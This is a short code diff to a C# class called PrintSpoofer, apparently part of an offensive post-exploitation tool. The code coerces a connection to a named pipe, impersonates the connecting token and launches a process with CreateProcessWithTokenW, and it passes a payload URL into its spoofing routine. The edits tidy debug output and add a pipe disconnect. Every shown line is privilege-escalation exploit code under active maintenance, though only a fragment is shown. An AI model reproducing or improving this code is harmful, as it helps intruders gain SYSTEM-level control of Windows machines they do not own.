@@ -32,7 +32,6 @@ internal static class PrintSpoofer
         byte[] commandBytes = Encoding.Unicode.GetBytes(
             $"\\\\{computerName} \\\\{computerName}/pipe/{pipeName}"
         );
-
         var tasks = new List<Task>
         {
             Task.Run(async () => await Spoof(pipe, payloadUrl, executeCmd)),
@@ -118,7 +117,7 @@ internal static class PrintSpoofer
 
                 if (RuntimeConfig.IsDebugEnabled)
                 {
-                    Console.WriteLine($"Executing {binary} as {name}");
+                    Console.WriteLine($"Executing \"{binary}\" as {name}");
                 }
 
                 Lib.CreateProcessWithTokenW(
@@ -134,9 +133,9 @@ internal static class PrintSpoofer
                 );
 
                 if (pi.dwProcessId != 0 && RuntimeConfig.IsDebugEnabled)
-                    Console.WriteLine(
-                        $"Impersonation was successful - PID: {pi.dwProcessId}"
-                    );
+                    Console.WriteLine($"Impersonation was successful - PID: {pi.dwProcessId}");
+
+                Lib.DisconnectNamedPipe(pipe);
             }
             else
             {
